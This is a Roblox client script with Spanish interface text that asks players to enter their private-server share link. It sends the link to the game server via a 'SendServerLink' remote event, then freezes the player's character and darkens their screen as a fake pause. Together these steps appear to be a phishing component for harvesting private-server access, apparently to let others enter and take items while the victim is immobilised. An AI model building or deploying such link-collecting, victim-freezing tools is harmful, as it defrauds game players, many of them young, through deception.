local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- Crear UI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local Button = Instance.new("TextButton")
local Label = Instance.new("TextLabel")
local ErrorLabel = Instance.new("TextLabel") -- Mensaje de error

ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

-- Frame más grande
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
Frame.BorderSizePixel = 0
Frame.ZIndex = 10

-- Label
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.new(1, 1, 1)
Label.BackgroundTransparency = 1
Label.ZIndex = 11

-- TextBox más grande
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code"
TextBox.ZIndex = 12

-- Error Label
ErrorLabel.Parent = Frame
ErrorLabel.Size = UDim2.new(1, -20, 0, 30)
ErrorLabel.Position = UDim2.new(0, 10, 0, 110)
ErrorLabel.Text = ""
ErrorLabel.TextColor3 = Color3.new(1, 0, 0)
ErrorLabel.BackgroundTransparency = 1
ErrorLabel.ZIndex = 13

-- Button
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
Button.TextColor3 = Color3.new(1, 1, 1)
Button.ZIndex = 14

-- Validar link
local function isValidLink(link)
    return string.find(link, "https://www.roblox.com/share?code") ~= nil
end

-- Función para "pausar" todo solo para el jugador
local function simulateFreezeForPlayer()
    -- Deshabilitar animaciones del personaje
    local character = Player.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            for _, anim in pairs(humanoid:GetPlayingAnimationTracks()) do
                anim:Stop()
            end
        end
    end

    -- Overlay negro/transparente para dar sensación de “pausa”
    local overlay = Instance.new("Frame")
    overlay.Parent = Player:WaitForChild("PlayerGui")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.new(0, 0, 0)
    overlay.BackgroundTransparency = 0.5
    overlay.ZIndex = 50
end

-- Botón
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isValidLink(link) then
        local remoteEvent = ReplicatedStorage:WaitForChild("SendServerLink")
        remoteEvent:FireServer(link)
        simulateFreezeForPlayer()
        ErrorLabel.Text = "" -- limpiar error si existía
    else
        ErrorLabel.Text = "El link no es válido" -- mostrar error al jugador
    end
end)
